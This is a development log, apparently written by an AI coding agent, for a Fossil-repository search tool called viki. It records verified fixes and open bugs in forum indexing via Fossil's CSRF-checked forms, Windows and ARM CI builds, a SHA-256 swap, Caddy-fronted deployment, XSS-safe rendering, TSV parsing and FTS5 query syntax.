**Date:** 2026-08-13, closing out the forum-indexing honesty hole.

The entry below ("Forum posts: no `fossil forum` export subcommand ... NOT
verified against a live post") gave up on scripting `/forume1` because the
POST "kept re-rendering the empty New Forum Thread form," and guessed the
cause was "an AJAX/JS-driven submit flow that static form scraping doesn't
capture." **That guess was wrong.** There is no AJAX involved. The form is
an ordinary `<form method="POST">`, and the reason the POST silently
degraded into a re-render is one missing HTTP header.

`forumnew_page()` (`vendor/fossil-see/vendor/fossil/src/forum.c`) gates
creation on `if( P("submit") && cgi_csrf_safe(2) )`. `cgi_csrf_safe()`
(`src/cgi.c`) requires *three* things, and the first one is the trap:

```c
int cgi_same_origin(int bErrorLog){
  ...
  zRef = P("HTTP_REFERER");
  if( zRef==0 ) return 0;          /* <-- no Referer header == not same origin */
  ...  /* then: strncmp(g.zBaseURL, zRef, strlen(g.zBaseURL)) */
}
```

So: (1) a `Referer:` that prefix-matches `g.zBaseURL`, (2) `REQUEST_METHOD`
`POST`, (3) a `csrf` parameter matching `g.zCsrfToken`. Miss any one and
Fossil does **not** error -- it falls through and re-paints the empty form,
which looks exactly like a UI refusing to be scripted. The previous attempt
found the `csrf` token and the field names; it just never sent `Referer`.
(The disabled-until-you-press-Preview Submit button is client-side only;
the server only checks that `submit` is *present*.)

The clean recipe needs **no listening socket, no port, no background
process, and no browser** -- `fossil http` handles exactly one request read
from a file:

```sh
export FOSSIL_SEE_KEY=...           # inherited by the child like any env var
F=vendor/fossil-see/build/dist/fossil-see
R=/path/to/repo.efossil

# 1. GET the form to learn this session's anti-CSRF token.
printf 'GET /forume1 HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n' > req
$F http --localauth --nossl --ipaddr 127.0.0.1 --host 127.0.0.1 \
        --in req --out resp "$R"
CSRF=$(sed -n 's/.*name="csrf" value="\([^"]*\)".*/\1/p' resp | head -1)

# 2. POST it back. Note the Referer line -- that is the load-bearing part.
BODY="csrf=$(urlencode "$CSRF")&title=$(urlencode "$TITLE")\
&mimetype=text%2Fx-markdown&content=$(urlencode "$CONTENT")&submit=Submit"
{ printf 'POST /forume1 HTTP/1.0\r\n'
  printf 'Host: 127.0.0.1\r\n'
  printf 'Referer: http://127.0.0.1/forume1\r\n'
  printf 'Content-Type: application/x-www-form-urlencoded\r\n'
  printf 'Content-Length: %s\r\n\r\n' "$(printf %s "$BODY" | wc -c)"
  printf '%s' "$BODY"; } > req
$F http --localauth --nossl --ipaddr 127.0.0.1 --host 127.0.0.1 \
        --in req --out resp "$R"
grep '^Location:' resp        # => Location: http://127.0.0.1/forumpost/<hash>
```

`--localauth` grants loopback requests `sxy` capability with no password
(so no login/cookie dance), and only applies while the repo's own
`localauth` setting is off, which is the default. A **reply** is the same
POST to `/forume2` with `fpid=<hash>&reply=1` instead of `title=`; an
**edit** uses `edit=1`. `curl` against `fossil server --localauth --port N`
works identically -- just add `-H 'Referer: http://127.0.0.1:N/forume1'`;
`fossil http` is preferred only because there is no port to allocate and no
process to reap. A ready-to-run version of the above (with the `perl`
urlencode helper) was left at
`<scratchpad>/fossil-forum-post.sh` rather than committed, since where
test tooling belongs in this repo is not yet settled.

This is the **strongest available evidence**: the artifact is built by
Fossil's own `forum_post()`, which assembles the manifest, runs it back
through `manifest_parse()` and asserts `pPost->type==CFTYPE_FORUM` before
storing it. No hand-constructed artifact, no `test-content-put`. Fossil's
own tooling agrees: `fossil timeline --type f` shows
`Post: <title>` / `Reply: <title>`, and `fossil test-forumthread` reports
one thread with 2 posts. (Avenue 1 of the search is genuinely dead, and now
double-checked: `fossil help -a` lists no `forum` command, and `forum.c`'s
only `COMMAND:` is `test-forumthread`, which merely *displays* a thread.)

**Bug 1 (real, reproduced, still unfixed): the `H` title card is indexed
with Fossil's escaping still in it, making the thread title unsearchable.**
Single-line manifest cards escape their values; a real one looks like:

```
D 2026-08-13T21:26:23.454
H Pump\simpeller\scavitation\son\sthe\snorth\swell
N text/x-markdown
U warren
W 231
The north well pump started cavitating after we raised the setpoint. ...
Z 88682e21ec07aa52a0b3c29f6c338251
```

`find_line_card()` in `viki_index.c` returns that value raw, and
`index_forum()` prepends it to the body verbatim. Consequence, measured:

```
$ viki ask "impeller"      # a word that appears ONLY in the thread title
(no matches)
$ viki ask "simpeller"     # the \s-mangled token FTS5 actually stored
[1] forum:88028bf8...  Pump\[simpeller]\scavitation\son\sthe\snorth\swell
```

The fix is one call: `unquote_fossil()` already lives ~30 lines above
`find_line_card()` in the same file and is **byte-for-byte the same
mapping** as Fossil's own `defossilize()` (`src/encode.c:430`) -- same
eight cases `\n \s \t \r \v \f \0 \\`, same `default: c = z[i]` fallback
-- which is exactly the function Fossil itself applies to this field, at
`manifest.c:751`: `defossilize(p->zThreadTitle)`. `unquote_fossil()` was
written for `fossil ticket show --quote` and is simply never applied to
the `H` card. Probing the escaping with a hostile title confirms the
mapping is the one that matters: posting `A\B C<TAB>D "quoted" 50% n`
stores `H A\\B\sC\tD\s"quoted"\s50%\sn`. Not applied here because
verifying it requires rebuilding `build/dist/viki`, and `build/obj` is
shared state other agents may be using. `index_wiki()` is **not**
affected -- it goes through `fossil wiki export`, which emits the
rendered body, never a raw manifest.

**Bug 2 (real, reproduced, still unfixed): edited posts are indexed twice,
and the superseded version is returned as if it were current.** Editing a
post writes a *new* artifact carrying a `P <old-uuid>` card; the old one
stays in `event` with `type='f'`. `index_forum()`'s
`WHERE event.type='f'` therefore yields both. Observed after one edit:

```
$ fossil sql --readonly "SELECT blob.uuid FROM event JOIN blob \
    ON blob.rid=event.objid WHERE event.type='f';"     # 3 rows, not 2
$ viki index .   # "3 forum post(s)"
$ viki ask "duckweed in the strainer basket" --k 5
[1] forum:f159052d...  ... plugged with duckweed AND zebra mussel shell ...   <- current
[3] forum:7748d5c9...  ... half plugged with duckweed. ...                    <- SUPERSEDED
```

Fossil's own thread page (`/forumthread/<root>`) shows only the current
text. The repository already knows which is which: the `forumpost` table
has `fpid`/`froot`/`fprev`/`firt`, and a superseded post is exactly one
that appears as some other row's `fprev` (here `forumpost` held
`fpid|froot|fprev|firt` = `2|2||`, `3|2||2`, `4|2|3|2` -- rid 3 is
superseded by rid 4). This selector was **verified at the SQL level** on
that repo, returning exactly the two current posts and dropping the
superseded one:

```sql
SELECT blob.uuid FROM event JOIN blob ON blob.rid=event.objid
 WHERE event.type='f'
   AND blob.rid NOT IN (SELECT fprev FROM forumpost WHERE fprev IS NOT NULL);
```

It has **not** been wired into `viki_index.c` or run through `viki index`
(same rebuild constraint as bug 1), so treat it as a verified query, not
a verified fix.

The wrong assumption this replaces: not just "forum posts can't be created
headlessly," but the broader one that the forum path was *structurally the
same code* as the already-verified wiki path and therefore low-risk. It
isn't. Wiki content arrives pre-rendered from `fossil wiki export`; forum
content arrives as a raw manifest, which brings card escaping and artifact
versioning along with it. Both bugs live precisely in that difference, and
neither was findable without a live post.

## Windows CI actually works -- three distinct bugs found and fixed by really running it, not by reasoning about it

**Date:** 2026-08-13, first real Windows CI run.

Before touching anything, the open question was whether `fork()`/
`pipe()`/`waitpid()` (`viki_cache.c`, `viki_index.c`, subprocess calls
to `fossil`) and BSD sockets headers (`viki_serve.c`) would even
*compile* on Windows at all, since plain MinGW provides neither. The
answer, confirmed empirically: use MSYS2's plain **MSYS** environment
(`msystem: MSYS` in `msys2/setup-msys2`), not **MINGW64** -- MSYS's
runtime (same lineage as Cygwin) is POSIX-emulating and provides both,
with **zero source changes** to `viki_cache.c`/`viki_index.c`/
`viki_serve.c`. That part worked on the very first CI attempt. The
trade-off, stated plainly: the resulting `viki.exe` depends on
`msys-2.0.dll` at runtime (not yet bundled in the release artifact --
open item, see AGENTS.md) rather than being a fully standalone native
binary; that's the honest cost of not rewriting three files' worth of
process/socket handling to raw Win32 APIs.

What remained -- and took three CI round-trips, each one a *real*
compile+run, not a guess -- was `viki embed-selftest` failing to load
the ONNX model:

1. **`_WIN32` is not defined under MSYS's gcc.** `src/embed.c`
   originally guarded a UTF-16 path conversion with `#ifdef _WIN32`,
   matching `onnxruntime_c_api.h`'s own `ORTCHAR_T` typedef (which is
   also gated on `_WIN32`). Both evaluated false under MSYS -- MSYS,
   like Cygwin, doesn't define `_WIN32` because it presents a POSIX-like
   environment by design. Result: the guard was silently skipped, and
   `CreateSession` got the same narrow `char*` as on Unix, while
   `onnxruntime.dll` (a real Microsoft Windows build, genuinely compiled
   with `_WIN32`) read it as UTF-16 anyway -- every two ASCII bytes
   became one garbage wide char, producing an unreadable mojibake
   "file not found" error. **Fix:** stop relying on ambient `_WIN32`/
   `__MSYS__` state entirely -- `build.sh` now passes an explicit
   `-DVIKI_WIN_ORT_PATH` when (and only when) linking against the
   Windows onnxruntime build, and `embed.c` hand-widens the (always-
   ASCII, in this project) path byte-by-byte rather than calling
   `MultiByteToWideChar` (`<windows.h>` availability under plain MSYS,
   as opposed to MINGW64, was never confirmed, so this sidesteps that
   question too), casting the result to whatever `ORTCHAR_T` resolves
   to locally -- correct either way, since C passes a pointer through
   uninterpreted; only the bytes at the far end matter to
   `onnxruntime.dll`.
2. **MSYS-style paths aren't Win32 paths.** After (1), the error
   message became *readable* (`/d/a/viki/viki/build/dist/model/model.onnx`)
   but still "File doesn't exist" -- `pwd` under MSYS bash returns an
   MSYS-style absolute path, which only an MSYS-runtime binary can
   interpret (viki.exe's own `fopen()` calls work because `msys-2.0.dll`
   translates them transparently; `onnxruntime.dll`, a native Win32
   library with no MSYS awareness, calls raw `CreateFileW` with
   whatever bytes it's given and gets a path that doesn't exist on any
   real filesystem root). **Fix:** `build.sh` now runs `SCRIPT_DIR`/
   `REPO_ROOT` through `cygpath -m` (mixed: drive-letter + forward
   slashes) when `cygpath` is available, so every absolute path the
   script builds downstream -- not just the ones handed to
   `embed-selftest` -- is something both Win32 APIs and the rest of the
   (still forward-slash-assuming) bash script can use. No-op on
   macOS/Linux, where `cygpath` doesn't exist.
3. Once both were fixed, `embed-selftest` passed outright on the next
   CI run: real model load, real inference, the same semantic property
   check (`cosine(horses/trough, horses/watering-hole) > cosine(...,
   tax-filing-deadline)`) passing on Windows as it does everywhere else.
   `ndvss instruction set: avx2` in the same run also confirms
   `sqlite-ndvss`'s runtime CPU dispatch works correctly on Windows,
   not just the ONNX path.

The throughline: none of these three would have been caught by
inspection alone -- (1) requires knowing MSYS's specific `_WIN32`
behavior, (2) only shows up once (1) is fixed and the *next* layer of
wrongness becomes visible, and (3) is the actual proof, not an
assumption. Each fix was verified by an actual CI run before moving to
the next, exactly this project's standing rule (see the top of this
file, and every other entry in it) applied to a platform with zero
local dev-machine access to test against directly.

## CI: linux-arm64 build fails in vendor/sqlite-ndvss, not in viki's own code -- a real bug in that project, marked experimental rather than worked around

**Date:** 2026-08-13, first CI run on `ubuntu-24.04-arm`.

`sqlite-ndvss.c`'s `sqlite3_ndvss_init()` picks a SIMD backend by
`#if defined(__aarch64__) && defined(__linux__)`, then does a *runtime*
check (`getauxval(AT_HWCAP2) & HWCAP2_SVE2`) to decide whether to call
`LOAD_SIMILARITY_FUNCTIONS(sve2)` or `LOAD_SIMILARITY_FUNCTIONS(neon)`.
But the `sve2` function bodies themselves
(`similarity_functions_sve2.h`) are only compiled in when the
*compile-time* macro `__ARM_FEATURE_SVE` is defined (i.e. the compiler
was invoked with an SVE-enabling `-march=`), which viki's build.sh
never passes (`cc -O3 -ffast-math ...`, no `-march`). Result: the
`__aarch64__ && __linux__` branch is unconditionally compiled in
regardless of that separate compile-time gate, and its `sve2` dispatch
line references `cosine_similarity_f_sve2` and friends, which don't
exist in this translation unit at all -- `error: 'cosine_similarity_f_sve2'
undeclared`. Not a bug in anything viki's own code does; it's a gap in
`vendor/sqlite-ndvss` (a runtime-detection branch not matching its own
compile-time feature gate) that only surfaces on an aarch64 Linux
compiler invocation without SVE-enabling `-march=` flags -- exactly
this CI runner's default, and exactly viki's own default (macOS arm64
doesn't hit this path at all: it takes the separate `__APPLE__` branch,
unconditionally NEON, no runtime SVE2 detection).

Not fixed here: `vendor/sqlite-ndvss` is Warren's own fork, but a
separate repo/submodule -- fixing it properly means either gating the
`sve2` dispatch call behind the same `__ARM_FEATURE_SVE` compile-time
check `similarity_functions_sve2.h` already uses, or having viki's
build.sh pass an SVE-enabling `-march=` on aarch64 Linux (untested
whether that alone is sufficient -- the file is named "sve2" but its
own guard checks the baseline `__ARM_FEATURE_SVE`, not
`__ARM_FEATURE_SVE2`, and it's not verified whether the function bodies
inside actually need SVE2-only intrinsics that plain `+sve` codegen
wouldn't provide). Marked `experimental: true` (continue-on-error) in
`.github/workflows/build.yml` rather than sunk further time into a
different project's build system; whoever next touches
`vendor/sqlite-ndvss` should start from the exact line numbers above.

## Decoupled viki's build from vendor/fossil-see -- releasing a standalone binary needed it, and it was cheaper than expected

**Date:** 2026-08-13, preparing a v0.1.0 GitHub release.

`build/build.sh` used to require `vendor/fossil-see/build/build.sh` to
have already run, purely to reuse two of its build *outputs* as a side
effect: the SQLCipher/SQLite amalgamation (for viki's own local,
deliberately-unencrypted FTS5 cache db -- viki never touched the
SQLCipher codec part) and LibreSSL's `libcrypto.a` (for one `EVP_Digest`
call in `src/sha256.c`). Building fossil-see first meant building
LibreSSL from source, several minutes even on a fast machine -- fine for
local dev where it's a one-time cost, but wrong for "anyone downloads a
`viki` release binary and runs it" or "CI builds every push," where that
several-minute prerequisite has to happen on every clean checkout with
no payoff (nothing about viki's own functionality needs SQLCipher or
LibreSSL specifically).

**Fix:**

- `src/sha256.c`: replaced the LibreSSL `EVP_Digest(..., EVP_sha256(),
  ...)` call with a ~150-line standalone FIPS 180-4 SHA-256
  implementation (single-shot, no streaming API needed -- every caller
  already has the whole buffer in memory). Verified correct against four
  known test vectors (empty string, `"abc"`, the NIST 56-byte multi-block
  vector, and a longer string), each cross-checked byte-for-byte against
  `shasum -a 256` on the same input before wiring it in. `content_hash`
  is purely an internal cache key (see the entry below on rejecting
  Fossil's own `sha3.c` for the same reason) -- never compared against or
  exposed as a Fossil artifact hash -- so a small vendored implementation
  is an appropriate trade here even without LibreSSL's audit history
  behind it. Same algorithm, same output: existing `content_hash` values
  in an already-populated cache db are unaffected (verified: re-indexed
  the same test corpus after the swap, got byte-identical hashes and
  identical `viki ask` rankings).
- Swapped the reused SQLCipher amalgamation for the official SQLite
  amalgamation direct from sqlite.org (`build/versions.env`'s
  `SQLITE_AMAL_*`), fetched and SHA256-pinned the same way ONNX Runtime
  and the embedding model already were (`fetch_verify()` -- one pattern,
  three uses now, not two-plus-a-different-story). sqlite.org publishes
  its own SHA3-256 on the download page; cross-checked it matched at pin
  time, but still pinned an independently-computed SHA256 here, for
  consistency with how every other download in this file is verified.
  Compiled with the identical flags as before (`-DSQLITE_ENABLE_FTS5`,
  no `-DSQLITE_HAS_CODEC`) -- no behavior change, just a different
  (simpler, smaller, dependency-free) source for the same amalgamation
  file shape.
- `vendor/fossil-see` stays a git submodule -- not for the build, but
  because *some* fossil-compatible binary is still needed at **runtime**
  (`fossil wiki`/`ticket` export, `fossil sql`, `fossil uv` push/pull).
  That resolution was already dynamic (`viki_fossil_binary()` in
  `viki_cache.c`: `$VIKI_FOSSIL_BIN`, else whatever `fossil` is on
  `$PATH`) and didn't need to change -- stock `fossil` works fine for
  indexing an unencrypted repo, which is what every test in this project
  has used so far anyway.

**Verified:** full clean rebuild (`rm -rf build/obj build/dist`) with
`vendor/fossil-see` never built at all -- succeeds, binary is smaller
(1.4M vs. 2.6M, no longer statically linking `libcrypto.a`), and the
existing index+ask smoke test against `/tmp/viki-content-test` still
returns the same ranked results as before the swap.

## `viki serve`'s internet exposure: Caddy reverse proxy, not TLS/auth in C -- and a real `-d` vs. file bug caught only by dry-running the deploy script

**Date:** 2026-08-13, putting `viki serve` on the internet.

`viki serve` was built loopback-only with no auth (see the entry below).
Once the actual requirement became "serve this from the internet," the
options were: implement TLS + auth directly in `viki_serve.c` (link
libssl, hand-roll a TLS server, a credential store, timing-safe
comparison), or terminate TLS/auth in front of it. Went with the latter,
matching a decision this repo already made for the exact same problem:
`server/SERVER_SETUP.md`'s D-8 puts the real `fossil server` process
behind Caddy for automatic Let's Encrypt TLS, with the backend never
facing the internet directly. `viki serve` reuses the *same* Caddy
instance rather than inventing a second TLS story: `server/setup-
viki-serve.sh` adds a `handle_path /viki/*` block with Caddy's
`basic_auth` into the existing `$DOMAIN { ... }` site block, and a
systemd unit runs `viki serve --host 127.0.0.1` under a dedicated
no-login user. No code changes to `viki_serve.c` were needed at all --
its already-loopback-only default (chosen before internet exposure was
even a stated requirement) turned out to be exactly the shape this
pattern needs.

Two real bugs were caught by testing the deploy script itself before
trusting it, rather than just reading it back:

1. **`awk -v var="<value with embedded newlines>"` failed on this
   machine's `awk`** (`awk: newline in string`) when trying to pass the
   whole Caddy config block to insert as a single multi-line `-v`
   value. Not every awk implementation accepts a raw newline inside a
   `-v` assignment. Fixed by writing the block to a temp file and using
   `sed`'s `r file` command (read-and-insert-after-match) instead, which
   needs no multi-line shell value at all -- discovered by literally
   running the insertion logic against a scratch Caddyfile, not by
   inspecting the script.
2. **A real fossil-checkout-detection bug**: the script's guard checked
   `[ -d "$VIKI_REPO_CHECKOUT/.fslckout" ]` -- but `.fslckout` (and its
   Windows counterpart `_FOSSIL_`) is a **file** (the checkout's SQLite
   db), not a directory. `-d` against a file is always false, so the
   check would have rejected every real, valid open checkout. Fixed to
   `-e` (existence, regardless of type). Caught by a full dry run of the
   script (stubbing `useradd`/`chown`/`systemctl`/`caddy` and pointing
   `/etc/...` paths at a scratch directory) against a fake checkout dir
   with a real `.fslckout` file in it -- exactly the kind of "run it and
   see" step that would have been skipped by just reading the sed/awk
   logic and reasoning it looked right, the way the first bug was found
   but this one wasn't (until the dry run).

The bcrypt hash Caddy generates (`caddy hash-password`) contains literal
`$` sequences (e.g. `$2a$14$...`) that look like shell parameter
expansions. Verified this is *not* a problem here: the hash only ever
flows through normal `"$VAR"` shell-variable expansion (command
substitution capturing it, then a double-quoted assignment/heredoc
re-using that variable) -- bash expands `$VIKI_HASH` once, as the
variable name, and does not re-scan the substituted *value* for further
`$` sequences. It would only be a real bug if the literal hash string
were written into a *second* unquoted shell context expecting further
expansion (e.g. `eval`), which nothing here does.

## `viki serve`: no new HTTP library needed; the real risk was XSS from indexed content, not the server plumbing

**Date:** 2026-08-13, building `viki serve`.

The HTTP server itself (`src/viki_serve.c`) is plain POSIX sockets --
`socket`/`bind`/`listen`/`accept`/`recv`/`send`, single-threaded, one
request per connection, `Connection: close`. No new dependency, no
third-party HTTP library; this is a local, personal-scale tool (one
user, occasional agent scripts), not a production web server, so the
concurrency and keep-alive corners plain sockets cut don't matter here.
Verified all four routes with `curl` against a real indexed repo:
`/api/health`, `/api/ask?q=&k=` (confirmed identical results to `viki
ask` on the same query -- both now call the one shared
`viki_ask_query()`), `/api/chunk?hash=&ix=` (round-tripped a hash from
an `/api/ask` response), and error paths (missing `q` -> 400, unknown
hash -> 404, unknown route -> 404, `POST` -> 405).

The actual design decision worth recording: the `/` search page renders
every server-supplied field (`source`, `snippet`, chunk text) via DOM
`textContent`, never `innerHTML`/string-concatenated HTML. This matters
because none of that content is trusted markup -- it's free text pulled
from indexed checkout files, wiki pages, tickets, and forum posts, any
of which could legitimately contain literal `<script>` or other HTML-
looking text (e.g. a ticket describing a bug *in* some HTML). Building
the page via `innerHTML = ...` with that text spliced in would be a
reflected-XSS-via-your-own-index bug: visiting `/` and searching for
content someone else wrote (a colleague's wiki edit, a forum reply)
would execute whatever HTML/script that person's text happened to
contain. `textContent` displays it as literal text unconditionally,
independent of what's inside it.

Also deliberate: no static-file serving. Every response is either the
one constant HTML string or JSON built from a DB query -- there's no
"read a file whose name came from the request" code path at all, so
there's no path-traversal surface to think about, rather than one that
needs an allowlist/sanitizer. And the server binds to whatever host
`--host` says (`127.0.0.1` default) with zero authentication -- fine for
a loopback-only personal tool, explicitly documented in `viki serve
--help`/usage as "do not expose this port to a network" rather than left
implicit.

## Forum posts: no `fossil forum` export subcommand; extracted via `fossil sql` against `event`/`blob` instead, and NOT verified against a live post

**Date:** 2026-08-13, indexing forum posts.

`fossil help forum` only prints web-UI settings help, not a subcommand;
`fossil help` lists no top-level `forum` command at all -- unlike `wiki`
and `ticket`, there's no CLI export path. Worked around with `fossil sql
--readonly`, which Fossil itself documents as a supported (if power-user)
feature, including a `content(X)` function that decompresses a stored
artifact by UUID:

```sql
SELECT blob.uuid FROM event JOIN blob ON blob.rid = event.objid
WHERE event.type = 'f';               -- list forum-post artifact UUIDs
SELECT content('<uuid>');              -- fetch one artifact's raw manifest
```

`event.type = 'f'` (checkins are `'ci'`, wiki `'w'`, tickets `'t'`) is
confirmed from `fossil help timeline`'s documented `--type` filter list,
not from reading Fossil's C source.

A forum-post manifest is a control-card format: `D` (date), `U` (user),
optionally `H` (thread title -- present on the thread-starting post,
absent on replies), and a `W <n>\n<n raw bytes>` counted-string card
holding the body (Fossil's mechanism for embedding arbitrary multi-line
content without escaping -- same card type wiki pages use). Parsing this
(`find_w_card`, `find_line_card` in `viki_index.c`) was verified against
a **real wiki artifact's raw manifest** (fetched the same way, via
`content()`), since wiki and forum posts share the `W`-card body
convention.

**Caveat, stated plainly:** `index_forum()` itself has NOT been round-trip
tested against an actual forum post. Creating one requires Fossil's
web UI, and scripting it via `curl` did not succeed -- login worked
(cookie jar; password set with `fossil user password <user> <pw>` run
from inside the open checkout, not via `-R`, which only works *before*
the subcommand), and `/forumnew`'s form fields (`title`, `content`,
`mimetype`, `csrf`) were all discovered and posted to `/forume1`, but the
response kept re-rendering the empty "New Forum Thread" form rather than
confirming creation -- consistent with an AJAX/JS-driven submit flow that
static form scraping doesn't capture. Abandoned rather than sunk further
time into browser automation for what is, structurally, the same
card-parsing code already verified against wiki content. Tested instead
for the graceful-empty-case: `viki index` against a repo with zero forum
posts reports `0 forum post(s), 0 (re)chunked` and does not crash. If
forum indexing produces wrong output on a real post, the most likely
culprit is a manifest-format assumption that doesn't hold for forum
specifically (e.g. reply posts referencing a parent via a card this
implementation doesn't parse) -- flagging for whoever verifies this next
with a live repo.

## `strtok_r` collapsing empty TSV fields corrupts more than tickets: applied `split_preserve_empty` defensively wherever line/field boundaries carry positional meaning

**Date:** 2026-08-13.

No new bug found here -- noting only that the forum/wiki extraction code
added alongside forum indexing deliberately avoids the `fossil sql`
*bulk* multi-row pipe-separated output style (the same shape that hid the
ticket TSV bug, see below) in favor of a two-step list-then-fetch-each
design: one query returns a newline-separated list of UUIDs, a second
query fetches one artifact's raw content at a time. Simpler than auditing
whether `fossil sql`'s bulk output has its own version of the empty-field
problem.

## `strtok_r` silently corrupts TSV parsing when fields are empty

**Date:** 2026-08-13, indexing tickets.

`fossil ticket show 0 --quote` dumps one ticket per line, tab-separated,
with all columns the TICKET table defines (`tkt_id`, `tkt_uuid`, ...,
`type`, `status`, `subsystem`, `priority`, `severity`, `foundin`,
`private_contact`, `resolution`, `title`, `comment`). A freshly-created
ticket has **eight consecutive empty fields** (type through
resolution) between `tkt_ctime` and `title` -- confirmed directly:
`1|uuid|mtime|ctime|||||||||title|comment` when tabs are shown as `|`.

Splitting each line with `strtok_r(line, "\t", &save)` looked reasonable
but is wrong: `strtok_r` (like `strtok`) treats a run of consecutive
delimiters as *one* delimiter and never yields an empty token between
them. So a data row with 8 empty fields in a row produced 6 fewer tokens
than the header row did, silently shifting every column after the gap
left by 6. Symptom: the ticket's `comment` text got labeled `"Status:
..."` in indexed output, and `"Title: ..."` vanished entirely -- both
because the column-index lookup (done once, against the header row,
which has no empty fields) no longer lined up with the data row's
shifted fields.

**Fix (`viki_index.c`, `split_preserve_empty`):** manual split that
walks the string once, replacing each delimiter with `\0` and recording
a field-start pointer *every* time, including for zero-length fields
between two adjacent delimiters. `strtok_r` is fine for whitespace-
separated tokens where empty fields are meaningless; it is the wrong
tool for any fixed-column format (TSV/CSV) where a field's *position*
carries meaning, which need a delimiter-preserving split. Applied the
same fix to the line-splitting (on `\n`) for consistency, though that
level wasn't observed to actually hit the bug in practice.

**Verified fixed:** re-indexed and asked; ticket content now correctly
shows `Title: Fix the trough pump` followed by the real comment text.

## `fossil ticket` commands require a resolvable user even for read-only queries; `fossil wiki` commands don't

**Date:** 2026-08-13, indexing tickets.

`fossil wiki list` / `fossil wiki export NAME -` ran successfully with no
user configured at all. The equivalent read-only ticket commands
(`fossil ticket show 0`, `fossil ticket list fields`, `fossil ticket
history UUID`) all refused outright: `cannot determine user / Cannot
figure out who you are!`, even though nothing about listing/reading
tickets is obviously a per-user operation. Not root-caused in Fossil's
source; just empirically confirmed and worked around the way Fossil's
own error message suggests: `viki_fossil_user()` (`viki_cache.h`)
resolves `$VIKI_FOSSIL_USER`, falling back to `$USER`, falling back to
the literal string `"viki"`, and `index_tickets` always passes `--user`
explicitly rather than relying on ambient environment/config state that
may or may not be present when `viki index` runs non-interactively (e.g.
from a script or another agent's shell).

---

## The ONNX embedding pipeline (rung 2) works, verified by a semantic property test, not just "it ran"

**Date:** 2026-08-13.

`viki embed-selftest` computes real sentence embeddings (tokenize -> ONNX
Runtime C API `Run` -> mean-pool over `last_hidden_state` using the
attention mask -> L2-normalize) and checks that cosine similarity between
two semantically related sentences is clearly higher than between an
unrelated pair. Observed: `cosine("six horses were grazing near the water
trough", "a group of horses stood by the watering hole") = 0.64`, vs.
`cosine(..., "the quarterly tax filing deadline is in April") = -0.05`.

More convincingly: `viki ask "livestock standing by a drinking pool"`
against an indexed corpus of 3 unrelated documents (horses/water-trough,
a grocery list, a tax-deadline note) correctly ranked the horses document
first, even though **the query shares zero literal words** with that
document -- FTS5 BM25 alone contributes nothing here (no term overlap at
all); the ranking is coming entirely from the vector leg. This is the
actual thing rung 2 is for, working, not assumed.

Model used: `sentence-transformers/all-MiniLM-L6-v2`'s `arm64`-quantization-
recipe ONNX export (~23MB, matches VIKI_DESIGN.md's rung-2 budget). Picked
the arm64 recipe specifically so it could be verified empirically on this
dev machine; **not yet verified on x86** -- see the "one universal pinned
model vs. per-arch quantized exports" tension noted in
`build/versions.env`.

## macOS's `dyld` looks up a linked dylib by its own embedded install name, not by whatever filename you copied it as

**Date:** 2026-08-13, wiring up ONNX Runtime.

After linking `viki` against ONNX Runtime's prebuilt `.dylib` and copying
*one* file (the one `-lonnxruntime` resolved against) next to the binary,
running it failed: `dyld: Library not loaded: @rpath/libonnxruntime.1.dylib`.
The copied file existed, just under a different name (`libonnxruntime.dylib`
or `libonnxruntime.1.29.0.dylib`, depending on which of the three
name/symlink variants `find` happened to return first).

Root cause: `dyld` resolves a runtime dependency by the *install name*
baked into the dylib itself at build time (macOS's `LC_ID_DYLIB`; SONAME
on Linux) -- not by whatever filename it currently has on disk. ONNX
Runtime's release tarball ships three names for the same library
(`libonnxruntime.dylib`, `libonnxruntime.1.dylib`, `libonnxruntime.1.29.0.dylib`
-- unversioned dev symlink, SONAME symlink, real versioned file), and the
binary references the SONAME one specifically regardless of which name
was used at link time.

**Fix (`build/build.sh`):** copy every `libonnxruntime.*` name/symlink
variant next to the binary (`cp -P` to preserve symlinks rather than
tripling the actual file content), not just the one the linker happened
to use.

## bsdtar's `--strip-components=1` didn't strip, unlike GNU tar

**Date:** 2026-08-13, extracting the ONNX Runtime release tarball.

`tar xzf onnxruntime-*.tgz -C "$dir" --strip-components=1` on this macOS
machine (bsdtar) left the tarball's top-level directory
(`onnxruntime-osx-arm64-1.29.0/`) intact as a subdirectory of `$dir`,
rather than stripping it as GNU tar (the usual assumption on Linux CI)
does. Not root-caused further (a bsdtar version quirk, a `-C`-plus-
`--strip-components` interaction, or something else) -- worked around
instead: extract into a scratch directory, then `mv` the single top-level
entry's contents up a level. This works identically on both `tar`
implementations and doesn't depend on `--strip-components` behaving the
same way everywhere.

---

## FTS5's default MATCH syntax is implicit-AND, not OR -- wrong default for natural-language queries

**Date:** 2026-08-13, building `viki ask`.

**Symptom:** `viki ask "horses at the water trough"` against a chunk whose
text was "Site two had six horses grazing near the water trough this
morning." returned **zero results**, even though every substantive word in
the query appeared in the text. A single-word query (`viki ask "horses"`)
worked fine.

**Root cause:** SQLite FTS5's default `MATCH` query syntax treats
space-separated bareword terms as an implicit `AND` -- every term must be
present in a row for it to match at all (not scored lower, *excluded
entirely*). The planted text does not contain the word "at" as a standalone
token, so the 5-term implicit-AND query failed outright.

**Fix (`src/viki_ask.c`, `build_or_query`):** build an explicit
`"term1" OR "term2" OR ...` query instead of passing the raw string to
`MATCH`. `bm25()` then ranks rows that match more/rarer terms higher --
the same "should-match-any, score-by-how-many" shape Lucene/Elasticsearch
default to, and the shape any natural-language search box needs. Each term
is double-quoted as an FTS5 string literal (embedded quotes doubled) so
punctuation in the raw query can't be misparsed as FTS5 query syntax
(`NEAR`, column filters, etc.).

**Verified fixed:** `viki ask "horses at the water trough"` now returns the
correct chunk, snippet-highlighting `[horses]`, `[the]`, `[water]`,
`[trough]`.

---

## sqlcipher-libressl's SQLite amalgamation is reusable, unmodified, for a second (unencrypted) purpose

**Date:** 2026-08-13, designing viki's build.

fossil-see's build already runs `vendor/fossil-see/vendor/sqlcipher-libressl`'s
`./configure && make sqlite3.c` to produce a SQLite amalgamation
(`sqlite3.c`/`sqlite3.h`) for the encrypted Fossil repo db. That amalgamation
also contains FTS5 (confirmed: `ext/fts5/` sources get pulled in and
`fts5parse.c` etc. get generated as part of producing it), gated behind
`-DSQLITE_ENABLE_FTS5` at the *final* compile step, same as `-DSQLITE_HAS_CODEC`
is gated for the encryption codec.

This means viki's own local (deliberately unencrypted -- it's disposable,
rebuildable, D-10) cache db doesn't need a second, separately-downloaded
SQLite amalgamation. `build/build.sh` compiles the *same* `sqlite3.c` a
second time with different flags (`-DSQLITE_ENABLE_FTS5`, no
